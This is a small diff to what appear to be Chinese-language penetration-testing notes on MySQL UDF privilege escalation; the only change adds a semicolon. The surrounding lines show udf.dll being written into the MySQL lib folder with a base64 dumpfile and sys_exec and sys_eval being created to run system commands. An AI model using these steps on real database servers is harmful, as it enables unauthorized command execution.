@@ -544,7 +544,7 @@ select from_base64("base64的内容") into dumpfile "D:\mysql-5.6.41-winx64\lib\
 创建2个函数:
 sys_exec 该函数无法回显结果
 sys_eval 可回显执行结果
-create function sys_exec RETURNS int soname 'udf.dll'
+create function sys_exec RETURNS int soname 'udf.dll';
 create function sys_eval returns string soname 'udf.dll';
 
 看下函数是否成功创建
